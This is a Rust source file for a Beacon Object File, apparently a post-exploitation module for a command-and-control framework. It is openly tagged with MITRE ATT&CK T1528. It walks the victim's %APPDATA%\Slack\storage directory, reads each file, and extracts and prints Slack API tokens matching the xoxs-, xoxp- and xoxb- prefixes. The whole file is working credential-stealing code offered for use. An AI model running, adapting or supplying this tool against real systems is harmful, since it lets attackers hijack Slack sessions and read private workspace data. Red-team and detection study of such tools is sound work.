//! # Slack Key BOF
//!
//! Reads Slack API tokens from local storage files under
//! `%APPDATA%\Slack\storage\`. Searches file contents for token patterns
//! such as "xoxs-", "xoxp-", and "xoxb-".
//! ## MITRE ATT&CK
//! - T1528 - Steal Application Access Token
//!
//! ## Arguments
//! - None.

#![no_std]

use alloc::vec;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, ERROR_NO_MORE_FILES,
};
use windows_sys::Win32::Storage::FileSystem::*;

unsafe extern "system" {
    fn ExpandEnvironmentStringsA(
        src: *const u8,
        dst: *mut u8,
        size: u32,
    ) -> u32;
}

const TOKEN_PREFIXES: &[&[u8]] = &[b"xoxs-", b"xoxp-", b"xoxb-"];

const MAX_FILE_SIZE: usize = 1024 * 1024;

fn cstr_to_str(buf: &[u8]) -> &str {
    let len = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
    core::str::from_utf8(&buf[..len]).unwrap_or("")
}

fn search_tokens(data: &[u8], filename: &str) -> usize {
    let mut count = 0usize;

    for &prefix in TOKEN_PREFIXES {
        if data.len() < prefix.len() {
            continue;
        }
        let mut i = 0;
        while i <= data.len() - prefix.len() {
            if &data[i..i + prefix.len()] == prefix {
                let start = i;
                let mut end = i + prefix.len();
                while end < data.len() && data[end] >= 0x21 && data[end] < 0x7f {
                    end += 1;
                }
                let token_len = end - start;
                if token_len > prefix.len() {
                    if let Ok(token) = core::str::from_utf8(&data[start..core::cmp::min(end, start + 128)]) {
                        println!("  [{}] {} ({} bytes)", filename, token, token_len);
                        count += 1;
                    }
                }
                i = end;
            } else {
                i += 1;
            }
        }
    }
    count
}

fn read_file_contents(path: &str) -> Option<alloc::vec::Vec<u8>> {
    let mut path_buf = alloc::vec::Vec::from(path.as_bytes());
    path_buf.push(0);

    unsafe {
        let handle = CreateFileA(
            path_buf.as_ptr(),
            0x80000000, // GENERIC_READ
            FILE_SHARE_READ,
            core::ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            core::ptr::null_mut(),
        );

        if handle == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut size_high: u32 = 0;
        let size_low = GetFileSize(handle, &mut size_high);
        let file_size = ((size_high as u64) << 32 | size_low as u64) as usize;

        if file_size == 0 || file_size > MAX_FILE_SIZE {
            CloseHandle(handle);
            return None;
        }

        let mut buf = vec![0u8; file_size];
        let mut bytes_read: u32 = 0;
        let ok = ReadFile(
            handle,
            buf.as_mut_ptr() as *mut u8,
            file_size as u32,
            &mut bytes_read,
            core::ptr::null_mut(),
        );
        CloseHandle(handle);

        if ok == 0 {
            return None;
        }

        buf.truncate(bytes_read as usize);
        Some(buf)
    }
}

#[rustbof::main]
fn main(_args: *mut u8, _len: usize) {
    println!("slackKey: Searching for Slack API tokens in local storage");

    let env_path = b"%APPDATA%\\Slack\\storage\\*\0";
    let mut expanded = [0u8; 512];
    let result = unsafe {
        ExpandEnvironmentStringsA(env_path.as_ptr(), expanded.as_mut_ptr(), expanded.len() as u32)
    };

    if result == 0 {
        eprintln!("Failed to expand environment string (error {:#X})", unsafe { GetLastError() });
        return;
    }

    let search_path = cstr_to_str(&expanded);
    println!("  Searching: {}", search_path);

    let dir_prefix = &search_path[..search_path.len() - 1]; // strip the '*'

    unsafe {
        let mut fd: WIN32_FIND_DATAA = core::mem::zeroed();
        let handle = FindFirstFileA(expanded.as_ptr(), &mut fd);

        if handle == INVALID_HANDLE_VALUE {
            let err = GetLastError();
            if err == 2 || err == 3 {
                println!("Slack storage directory not found - Slack may not be installed.");
            } else {
                eprintln!("FindFirstFileA failed (error {:#X})", err);
            }
            return;
        }

        let mut total_found: usize = 0;
        let mut files_checked: u32 = 0;

        loop {
            let name_bytes = core::slice::from_raw_parts(fd.cFileName.as_ptr() as *const u8, 260);
            let name = cstr_to_str(name_bytes);

            if fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 && !name.is_empty() {
                let mut full_path = alloc::string::String::from(dir_prefix);
                full_path.push_str(name);

                if let Some(data) = read_file_contents(&full_path) {
                    let found = search_tokens(&data, name);
                    total_found += found;
                }
                files_checked += 1;
            }

            if FindNextFileA(handle, &mut fd) == 0 {
                break;
            }
        }

        FindClose(handle);

        println!("Checked {} files, found {} token(s)", files_checked, total_found);
        if total_found > 0 {
            println!("SUCCESS.");
        } else {
            println!("No Slack tokens found.");
        }
    }
}
